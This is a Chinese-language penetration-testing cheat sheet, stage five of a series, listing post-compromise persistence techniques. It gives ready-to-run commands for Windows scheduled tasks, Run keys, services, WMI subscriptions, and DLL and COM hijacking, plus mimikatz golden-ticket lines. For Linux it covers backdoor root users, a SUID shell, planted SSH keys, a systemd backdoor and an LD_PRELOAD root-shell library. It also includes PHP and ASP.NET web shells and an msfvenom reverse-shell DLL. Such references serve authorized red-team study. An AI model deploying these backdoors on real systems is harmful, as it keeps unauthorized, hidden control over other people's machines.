# 🔒 阶段 5：持久化（Persistence）

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./05-Persistence.tr.md) • [🇬🇷 Ελληνικά](./05-Persistence.el.md)

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**目标：** 在系统重启或活动被发现后，仍能保持对已入侵系统的访问。

> **译注：** 持久化示例中的 `IEX(payload)`、`{CLSID}`、`HASH` 等是占位符。原文的 `echo "#!/bin/bash\n/tmp/shell"` 在不同 shell 中不一定生成实际换行，不能据此认定已创建有效脚本。注册表、计划任务、服务及系统文件的写入权限取决于具体配置。

---

## 🖥️ Windows 持久化

### 计划任务
```cmd
# 创建计划任务（以 SYSTEM 身份运行）
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# 使用指定用户
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# 系统启动时
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# 每小时
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# 列出任务
schtasks /query /fo LIST /v

# 删除任务
schtasks /delete /tn "TaskName" /f
```

### 注册表 Run 键
```cmd
# HKCU：当前用户（无需管理员权限）
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM：所有用户（需要管理员权限）
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce（执行一次后删除该条目）
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### 启动文件夹
```cmd
# 当前用户
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# 所有用户（需要管理员权限）
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### 服务
```cmd
# 创建服务（需要管理员权限）
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# 修改现有服务
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### WMI 事件订阅
```powershell
# 创建 WMI 持久化机制
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### DLL 劫持与搜索顺序
```cmd
# 查找 DLL 劫持机会
# 将恶意 DLL 放入应用程序目录
# 常见目标：
# - 未使用 DLL 完整路径的程序
# - 缺失的 DLL

# 创建恶意 DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### COM 劫持
```powershell
# 查找 COM 对象
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# 创建劫持项
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### 黄金票据与白银票据
```powershell
# 黄金票据：持久化域管理员访问
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# 白银票据：持久化服务访问
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🐧 Linux 持久化

### Cron 定时任务
```bash
# 用户 crontab
crontab -e
# 添加：* * * * * /tmp/shell.sh

# 系统 crontab
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Cron 目录
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### SSH 密钥
```bash
# 将公钥添加到 authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# root 访问
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### 后门用户
```bash
# 添加具有 root 权限的用户
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# 或直接添加到 /etc/passwd
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### SUID 二进制程序
```bash
# 复制 bash 并设置 SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# 以 root 身份执行
/tmp/.hidden -p
```

### systemd 服务
```bash
# 创建服务文件
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 启用并启动
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### bashrc / profile
```bash
# 添加到用户的 bashrc
echo '/tmp/shell &' >> ~/.bashrc

# 添加到全局 profile
echo '/tmp/shell &' >> /etc/profile

# 添加到 bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD
```bash
# 创建恶意共享库
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# 添加到 LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Web Shell（网页后门）
```bash
# PHP Web Shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# 更隐蔽的位置
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🌐 Web 持久化

### Web Shell 存放位置
```bash
# 常见 Web Shell 位置
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### ASP.NET Web Shell（网页后门）
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 📊 快速参考

### Windows 持久化方法

| 方法 | 位置 | 权限 |
|--------|----------|-----------|
| 注册表 Run 键 | HKCU/HKLM | 用户/管理员 |
| 计划任务 | 任务计划程序 | 用户/管理员 |
| 启动文件夹 | AppData/ProgramData | 用户/管理员 |
| 服务 | 服务 | 管理员 |
| WMI | WMI 订阅 | 管理员 |
| COM 劫持 | HKCU CLSID | 用户 |

### Linux 持久化方法

| 方法 | 位置 | 权限 |
|--------|----------|-----------|
| Cron | /etc/crontab | root |
| SSH 密钥 | ~/.ssh/authorized_keys | 用户 |
| SUID | 带有 +s 权限位的二进制程序 | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | 用户 |

---

## 🔗 相关速查表

- [PowerShell](../../PowerShell/README.md)
- [Linux 命令](../../Linux-Commands/README.md)
- [Metasploit](../../Metasploit/README.md)

---

**上一阶段：** [← 04 - 横向移动](./04-Lateral-Movement.zh-CN.md)

**下一阶段：** [06 - 防御规避 →](./06-Defense-Evasion.zh-CN.md)
